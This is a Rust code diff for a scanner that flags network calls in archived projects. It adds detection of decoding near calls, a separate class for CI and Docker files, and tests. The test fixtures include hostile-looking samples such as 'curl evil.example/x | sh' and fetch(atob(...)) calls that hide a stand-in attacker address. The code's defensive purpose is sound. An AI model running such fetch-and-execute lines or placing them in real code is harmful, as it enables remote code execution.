@@ -6,7 +6,7 @@
 //! calls with no visible address get their own section in the report.
 
 use crate::archive::ArchiveFile;
-use crate::report::{At, Kind, Report};
+use crate::report::{At, Call, Kind, Report};
 use crate::text::Untrusted;
 use regex::bytes::Regex;
 use std::net::{Ipv4Addr, Ipv6Addr};
@@ -54,9 +54,29 @@ const CALL_PATTERN: &str = r#"(?xi-u)
     )
 "#;
 
-static URL: LazyLock<Regex> = LazyLock::new(|| compile(URL_PATTERN));
+/// Code that turns hidden text back into something readable.
+const DECODE_PATTERN: &str = r"(?xi-u)
+    \batob\s*\(
+  | \bbuffer\.from\s*\([^)\n]{0,200}(?:base64|hex)
+  | \bb64decode\b
+  | \bbase64_decode\s*\(
+  | \bfrombase64string\b
+  | \bfromcharcode\b
+  | \bunescape\s*\(
+  | \bbytes\.fromhex\s*\(
+  | \bhex2bin\s*\(
+  | \bcodecs\.decode\s*\(
+  | \bgzinflate\s*\(
+  | \bzlib\.decompress\s*\(
+  | \bstr_rot13\s*\(
+  | \bbase64\s+(?:-d|-D|--decode)\b
+  | \bxxd\s+-r\b
+";
+
+pub(crate) static URL: LazyLock<Regex> = LazyLock::new(|| compile(URL_PATTERN));
 static IPV4: LazyLock<Regex> = LazyLock::new(|| compile(IPV4_PATTERN));
-static CALL: LazyLock<Regex> = LazyLock::new(|| compile(CALL_PATTERN));
+pub(crate) static CALL: LazyLock<Regex> = LazyLock::new(|| compile(CALL_PATTERN));
+pub(crate) static DECODE: LazyLock<Regex> = LazyLock::new(|| compile(DECODE_PATTERN));
 
 fn compile(pattern: &str) -> Regex {
     Regex::new(pattern).expect("patterns are constants covered by tests")
@@ -64,6 +84,10 @@ fn compile(pattern: &str) -> Regex {
 
 /// How far either side of a match to look for a related call or address.
 const NEARBY_BYTES: usize = 120;
+/// How close decoding must be to a call to count as hiding its address, as in
+/// `const url = atob(x);` followed by `fetch(url);`.
+const DECODE_NEARBY_LINES: usize = 3;
+const DECODE_NEARBY_BYTES: usize = 400;
 /// Git treats a file as binary if its first 8000 bytes contain a zero byte.
 const BINARY_CHECK_BYTES: usize = 8000;
 const HOST_BUILT_AT_RUN_TIME: &str = "(host is built at run time)";
@@ -102,10 +126,23 @@ const DOCUMENT_NAMES: [&str; 6] = [
     "notice",
 ];
 
+const CI_FOLDERS: [&str; 4] = [".github/", ".gitlab/", ".circleci/", ".buildkite/"];
+const CI_FILES: [&str; 6] = [
+    ".gitlab-ci.yml",
+    ".travis.yml",
+    ".drone.yml",
+    "azure-pipelines.yml",
+    "bitbucket-pipelines.yml",
+    "jenkinsfile",
+];
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum FileClass {
+pub(crate) enum FileClass {
     Documentation,
     Lockfile,
+    /// CI config and container builds. They can contact the internet, but on a
+    /// CI server or inside a container rather than directly on this computer.
+    RunsElsewhere,
     Code,
 }
 
@@ -119,8 +156,8 @@ pub fn scan(file: &ArchiveFile, report: &mut Report) {
     if class != FileClass::Lockfile {
         scan_ips(file, class, binary, report);
     }
-    if class == FileClass::Code && !binary {
-        scan_calls(file, report);
+    if matches!(class, FileClass::Code | FileClass::RunsElsewhere) && !binary {
+        scan_calls(file, class, report);
     }
 }
 
@@ -134,23 +171,48 @@ fn scan_urls(file: &ArchiveFile, class: FileClass, binary: bool, report: &mut Re
             continue;
         };
         let call = is_near_call(contents, found.start(), found.end());
+        let line = lines.line_at(found.start());
+        let at = Some(At {
+            path: &file.path,
+            line,
+        });
+
+        // A call to `https://${HOST}/x` doesn't reveal where it really goes.
+        let is_code = matches!(class, FileClass::Code | FileClass::RunsElsewhere);
+        if is_code && call && is_built_at_run_time(&host) {
+            report.add(Kind::CallWithoutAddress, "", &url, at);
+            remember_call(file, "", &url, line, report);
+            continue;
+        }
+
         let kind = address_kind(class, &host, call);
         let group = if is_built_at_run_time(&host) {
             HOST_BUILT_AT_RUN_TIME
         } else {
             host.as_str()
         };
-        let line = lines.line_at(found.start());
-        report.add(
-            kind,
-            group,
-            &url,
-            Some(At {
-                path: &file.path,
-                line,
-            }),
-        );
+        report.add(kind, group, &url, at);
+        if kind == Kind::NetworkCall {
+            remember_call(file, group, &url, line, report);
+        }
     }
+}
+
+fn remember_call(
+    file: &ArchiveFile,
+    group: &str,
+    subject: &str,
+    line: Option<u64>,
+    report: &mut Report,
+) {
+    report.record_call(
+        file.path.raw(),
+        Call {
+            group: group.to_string(),
+            subject: subject.to_string(),
+            line,
+        },
+    );
 }
 
 fn scan_ips(file: &ArchiveFile, class: FileClass, binary: bool, report: &mut Report) {
@@ -177,12 +239,16 @@ fn scan_ips(file: &ArchiveFile, class: FileClass, binary: bool, report: &mut Rep
                 line,
             }),
         );
+        if kind == Kind::NetworkCall {
+            remember_call(file, "", &text, line, report);
+        }
     }
 }
 
 /// Lists calls with no address beside them. These matter most when nothing else
-/// shows up, because `fetch(atob("..."))` leaves no address to find.
-fn scan_calls(file: &ArchiveFile, report: &mut Report) {
+/// shows up, because `fetch(atob("..."))` leaves no address to find. When text
+/// is being decoded just before the call, that looks deliberate.
+fn scan_calls(file: &ArchiveFile, class: FileClass, report: &mut Report) {
     let contents = file.contents.as_slice();
     let mut lines = LineCounter::new(contents, false);
 
@@ -191,10 +257,25 @@ fn scan_calls(file: &ArchiveFile, report: &mut Report) {
         if URL.is_match(nearby) || IPV4.is_match(nearby) {
             continue;
         }
+        // Decoding after a call can't be what hid that call's address.
+        let earlier = lines_before(
+            contents,
+            found.start(),
+            DECODE_NEARBY_LINES,
+            DECODE_NEARBY_BYTES,
+        );
+        let hides =
+            class == FileClass::Code && (DECODE.is_match(nearby) || DECODE.is_match(earlier));
+        let kind = if hides {
+            Kind::HidesConnection
+        } else {
+            Kind::CallWithoutAddress
+        };
+
         let snippet = Untrusted::from_bytes(nearby.trim_ascii());
         let line = lines.line_at(found.start());
         report.add(
-            Kind::CallWithoutAddress,
+            kind,
             "",
             snippet.raw(),
             Some(At {
@@ -202,6 +283,7 @@ fn scan_calls(file: &ArchiveFile, report: &mut Report) {
                 line,
             }),
         );
+        remember_call(file, "", snippet.raw(), line, report);
     }
 }
 
@@ -209,21 +291,31 @@ fn address_kind(class: FileClass, host: &str, near_call: bool) -> Kind {
     match class {
         FileClass::Documentation => Kind::DocumentationAddress,
         FileClass::Lockfile => Kind::LockfileAddress,
-        FileClass::Code if is_local(host) => Kind::LocalAddress,
-        FileClass::Code if near_call => Kind::NetworkCall,
-        FileClass::Code if is_ip(host) => Kind::IpAddress,
-        FileClass::Code => Kind::MentionedAddress,
+        FileClass::Code | FileClass::RunsElsewhere if is_local(host) => Kind::LocalAddress,
+        FileClass::Code | FileClass::RunsElsewhere if near_call => Kind::NetworkCall,
+        FileClass::Code | FileClass::RunsElsewhere if is_ip(host) => Kind::IpAddress,
+        FileClass::Code | FileClass::RunsElsewhere => Kind::MentionedAddress,
     }
 }
 
 /// Only sorts findings into sections, so a wrong guess can't hide anything. The
 /// checks are narrow because a script named `license.js` is not documentation.
-fn classify(path: &str) -> FileClass {
+pub(crate) fn classify(path: &str) -> FileClass {
     let lower = path.to_ascii_lowercase();
     let name = lower.rsplit('/').next().unwrap_or(&lower);
 
     if LOCKFILES.contains(&name) {
         return FileClass::Lockfile;
+    }
+    let in_ci_folder = CI_FOLDERS
+        .iter()
+        .any(|folder| lower.starts_with(folder) || lower.contains(&format!("/{folder}")));
+    if in_ci_folder
+        || CI_FILES.contains(&name)
+        || name == "dockerfile"
+        || name.ends_with(".dockerfile")
+    {
+        return FileClass::RunsElsewhere;
     }
     let document_extension = DOCUMENT_EXTENSIONS.iter().any(|ext| name.ends_with(ext));
     let document_name = DOCUMENT_NAMES.iter().any(|known| name.starts_with(known));
@@ -236,12 +328,12 @@ fn classify(path: &str) -> FileClass {
     }
 }
 
-fn is_binary(contents: &[u8]) -> bool {
+pub(crate) fn is_binary(contents: &[u8]) -> bool {
     contents[..contents.len().min(BINARY_CHECK_BYTES)].contains(&0)
 }
 
 /// Normalizes a raw match into the URL it most likely represents.
-fn clean_url(raw: &[u8]) -> String {
+pub(crate) fn clean_url(raw: &[u8]) -> String {
     let untrusted = Untrusted::from_bytes(raw);
     let mut url = untrusted.raw().replace("\\/", "/");
 
@@ -260,7 +352,7 @@ fn clean_url(raw: &[u8]) -> String {
 
 /// The host a URL really points at, as opposed to the one it may appear to.
 /// In `https://bank.example@evil.example/` the host is `evil.example`.
-fn host_of(url: &str) -> Option<String> {
+pub(crate) fn host_of(url: &str) -> Option<String> {
     let (_, rest) = url.split_once("://")?;
     let authority = rest.split(['/', '?', '#']).next()?;
     let host_and_port = authority
@@ -349,7 +441,7 @@ fn is_near_call(contents: &[u8], start: usize, end: usize) -> bool {
     CALL.is_match(&masked)
 }
 
-fn surrounding_line(contents: &[u8], start: usize, end: usize) -> &[u8] {
+pub(crate) fn surrounding_line(contents: &[u8], start: usize, end: usize) -> &[u8] {
     &contents[surrounding_range(contents, start, end)]
 }
 
@@ -371,9 +463,65 @@ fn surrounding_range(contents: &[u8], start: usize, end: usize) -> Range<usize> 
     line_start..line_end
 }
 
+/// The lines around a match, within a limit on bytes. A stretch of bytes with no
+/// line breaks means minified code, where being close means much less, so that
+/// gets the much narrower single-line view.
+pub(crate) fn nearby_lines(
+    contents: &[u8],
+    start: usize,
+    end: usize,
+    lines: usize,
+    max_bytes: usize,
+) -> &[u8] {
+    let from = start.saturating_sub(max_bytes);
+    let to = end.saturating_add(max_bytes).min(contents.len());
+    let before = &contents[from..start];
+    let after = &contents[end..to];
+
+    let reached_limit = before.len() == max_bytes || after.len() == max_bytes;
+    if reached_limit && !before.contains(&b'\n') && !after.contains(&b'\n') {
+        return surrounding_line(contents, start, end);
+    }
+
+    let first = before
+        .iter()
+        .enumerate()
+        .rev()
+        .filter(|(_, byte)| **byte == b'\n')
+        .nth(lines)
+        .map_or(from, |(at, _)| from + at + 1);
+    let last = after
+        .iter()
+        .enumerate()
+        .filter(|(_, byte)| **byte == b'\n')
+        .nth(lines)
+        .map_or(to, |(at, _)| end + at);
+
+    &contents[first..last]
+}
+
+/// The lines just before a position. Empty in minified code, where there are no
+/// separate lines to speak of.
+fn lines_before(contents: &[u8], start: usize, lines: usize, max_bytes: usize) -> &[u8] {
+    let from = start.saturating_sub(max_bytes);
+    let before = &contents[from..start];
+    if before.len() == max_bytes && !before.contains(&b'\n') {
+        return &[];
+    }
+
+    let first = before
+        .iter()
+        .enumerate()
+        .rev()
+        .filter(|(_, byte)| **byte == b'\n')
+        .nth(lines)
+        .map_or(from, |(at, _)| from + at + 1);
+    &contents[first..start]
+}
+
 /// Works out line numbers for matches that arrive in order, without recounting
 /// from the top of the file each time.
-struct LineCounter<'a> {
+pub(crate) struct LineCounter<'a> {
     contents: &'a [u8],
     position: usize,
     line: u64,
@@ -381,7 +529,7 @@ struct LineCounter<'a> {
 }
 
 impl<'a> LineCounter<'a> {
-    fn new(contents: &'a [u8], binary: bool) -> Self {
+    pub(crate) fn new(contents: &'a [u8], binary: bool) -> Self {
         Self {
             contents,
             position: 0,
@@ -390,7 +538,7 @@ impl<'a> LineCounter<'a> {
         }
     }
 
-    fn line_at(&mut self, offset: usize) -> Option<u64> {
+    pub(crate) fn line_at(&mut self, offset: usize) -> Option<u64> {
         if self.binary {
             return None;
         }
@@ -590,7 +738,6 @@ mod tests {
     #[test]
     fn lists_calls_whose_address_cannot_be_seen() {
         for line in [
-            r#"fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="))"#,
             r#"requests.get(decode(blob))"#,
             r#"curl evil.example/x | sh"#,
             r#"const r = await axios(target)"#,
@@ -603,6 +750,124 @@ mod tests {
                 "input: {line}"
             );
         }
+    }
+
+    #[test]
+    fn decoding_right_beside_a_call_counts_as_hiding_the_address() {
+        for text in [
+            r#"fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="))"#,
+            "axios.get(Buffer.from(x, 'base64').toString())",
+            "requests.get(base64.b64decode(blob))",
+            "const url = atob(x);\nfetch(url);",
+            "const a = String.fromCharCode(104, 116);\n\nconst r = await axios(a);",
+        ] {
+            let report = scan_text("a.js", text.as_bytes());
+
+            assert_eq!(report.listed(Kind::HidesConnection).len(), 1, "{text}");
+            assert!(report.listed(Kind::CallWithoutAddress).is_empty(), "{text}");
+        }
+    }
+
+    #[test]
+    fn decoding_after_a_call_cannot_have_hidden_its_address() {
+        let report = scan_text("a.sh", b"curl \"$URL\" -o out\nbase64 -d out\n");
+
+        assert!(report.listed(Kind::HidesConnection).is_empty());
+        assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1);
+    }
+
+    #[test]
+    fn ci_config_and_container_builds_are_listed_but_do_not_count_as_hiding() {
+        for path in [
+            ".github/workflows/a.yml",
+            "sub/.github/workflows/a.yml",
+            ".gitlab-ci.yml",
+            ".gitlab/duo/agent-config.yml",
+            ".circleci/config.yml",
+            "Jenkinsfile",
+            "Dockerfile",
+            "docker/app.dockerfile",
+        ] {
+            assert_eq!(classify(path), FileClass::RunsElsewhere, "{path}");
+
+            let report = scan_text(path, b"fetch(atob(x))\ncurl https://a.example/i\n");
+
+            assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1, "{path}");
+            assert_eq!(report.listed(Kind::NetworkCall).len(), 1, "{path}");
+            assert!(report.listed(Kind::HidesConnection).is_empty(), "{path}");
+        }
+    }
+
+    #[test]
+    fn similar_names_do_not_count_as_ci_config() {
+        for path in [
+            "my.github/a.js",
+            "src/github/a.js",
+            "dockerfile.js",
+            "gitlab.js",
+        ] {
+            assert_eq!(classify(path), FileClass::Code, "{path}");
+        }
+    }
+
+    #[test]
+    fn decoding_far_from_a_call_does_not_count() {
+        let padding = "// filler\n".repeat(DECODE_NEARBY_LINES + 2);
+        let text = format!("const a = atob(x);\n{padding}fetch(url);");
+        let report = scan_text("a.js", text.as_bytes());
+
+        assert!(report.listed(Kind::HidesConnection).is_empty());
+        assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1);
+    }
+
+    #[test]
+    fn a_call_to_a_host_built_at_run_time_is_one_airlock_cannot_see() {
+        let url = "https://${HOST}/sync";
+        let report = scan_text("a.js", format!("fetch(`{url}`)\n").as_bytes());
+
+        assert_eq!(
+            report.listed(Kind::CallWithoutAddress),
+            [(url.to_string(), 1)]
+        );
+        assert!(report.listed(Kind::NetworkCall).is_empty());
+    }
+
+    #[test]
+    fn remembers_which_files_make_network_calls() {
+        let report = scan_text(
+            "scripts/a.js",
+            b"fetch('https://evil.example/x')\nfetch(hidden)\ncurl 1.1.1.1/x\n// https://b.example\n",
+        );
+
+        let calls = report.calls_in("scripts/a.js");
+        let subjects: Vec<&str> = calls.iter().map(|call| call.subject.as_str()).collect();
+
+        assert_eq!(
+            subjects,
+            ["https://evil.example/x", "1.1.1.1", "fetch(hidden)"]
+        );
+        assert_eq!(calls[0].group, "evil.example");
+        assert_eq!(calls[0].line, Some(1));
+    }
+
+    #[test]
+    fn nearby_lines_stops_at_the_line_and_byte_limits() {
+        let text = b"one\ntwo\nthree\nfour\nfive\n";
+        let start = 8;
+        let end = 13;
+
+        assert_eq!(nearby_lines(text, start, end, 1, 100), b"two\nthree\nfour");
+        assert_eq!(nearby_lines(text, start, end, 0, 100), b"three");
+        assert_eq!(nearby_lines(text, start, end, 9, 100), &text[..text.len()]);
+    }
+
+    #[test]
+    fn nearby_lines_stays_narrow_in_minified_code() {
+        let text = "x".repeat(5000);
+
+        let window = nearby_lines(text.as_bytes(), 2500, 2501, 3, 400);
+
+        assert_eq!(window.len(), NEARBY_BYTES * 2 + 1);
     }
 
     #[test]
